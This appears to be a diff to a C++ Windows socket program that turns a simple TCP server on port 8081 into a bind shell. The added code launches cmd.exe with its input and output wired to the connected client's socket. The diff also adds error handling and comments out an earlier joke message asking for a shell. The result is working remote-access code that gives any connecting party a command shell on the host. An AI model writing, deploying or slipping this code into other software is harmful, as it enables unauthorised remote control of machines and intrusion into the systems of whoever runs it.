@@ -3,7 +3,7 @@
 #include <windows.h>
 
 using namespace std;
-#pragma comment(lib, "ws2_32.lib");                                                                         // Link with ws2_32.lib
+#pragma comment(lib, "ws2_32.lib")                                                                         // Link with ws2_32.lib
 
 void send_data(SOCKET clientSocket, const string &data)                                                     // Doesnot send special data 
 {
@@ -31,38 +31,79 @@ string receive_data(SOCKET clientSocket)
 
 int main()
 {
+    // Initialize Winsock
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
+    {
+        std::cerr << "WSAStartup failed.\n";
+        return 1;
+    }
+
+    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (listenSocket == INVALID_SOCKET) 
+    {
+        std::cerr << "socket failed.\n";
+        WSACleanup();
+        return 1;
+    }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(8080);                                                                      // Port 8080
+    serverAddr.sin_port = htons(8081);                                                                      
     serverAddr.sin_addr.s_addr = INADDR_ANY;                                                                // Any available network interface
     
-    WSADATA wsaData;
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+        std::cerr << "bind failed.\n";
+        closesocket(listenSocket);
+        WSACleanup();
+        return 1;
+    }
     
-    WSAStartup(MAKEWORD(2, 2), &wsaData);                                                                   // Initialize Winsock
-    SOCKET serversock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);                                          // Make socket
-    int bindResult = bind(serversock, (sockaddr*)&serverAddr, sizeof(serverAddr));                          // Bind
-    listen(serversock, SOMAXCONN);
+    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
+    {
+        std::cerr << "listen failed.\n";
+        closesocket(listenSocket);
+        WSACleanup();
+        return 1;
+    }
     
     cout << "Waiting for incoming connections..." << endl;
-    SOCKET clientSocket = accept(serversock, nullptr, nullptr);
+    SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
     
     cout << "Client connected!" << endl;
     
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-    send_data(clientSocket," Gib Shell pls UwU ");
-    cout << "got this -> " << receive_data(clientSocket) << endl;
+    // send_data(clientSocket," Gib Shell pls UwU ");
+    // cout << "got this -> " << receive_data(clientSocket) << endl;
+    SECURITY_ATTRIBUTES saAttr = {0};
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
 
+    PROCESS_INFORMATION pi = {0};
+    STARTUPINFOW si = {0};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdOutput = si.hStdError = si.hStdInput = (HANDLE)clientSocket;
+
+    
+    wchar_t command[] = L"cmd.exe";
+    if(!CreateProcessW(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+    {
+        std::cerr << "CreateProcess failed.\n";
+        closesocket(clientSocket);
+        WSACleanup();
+        return 1;
+    }
+
+
+    // cout << "got this -> " << receive_data(clientSocket) << endl;
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    cout << "got this -> " << receive_data(clientSocket) << endl;
-
     closesocket(clientSocket);
-    closesocket(serversock);
-
+    closesocket(listenSocket);
+    
     WSACleanup();
     return 0;
 }
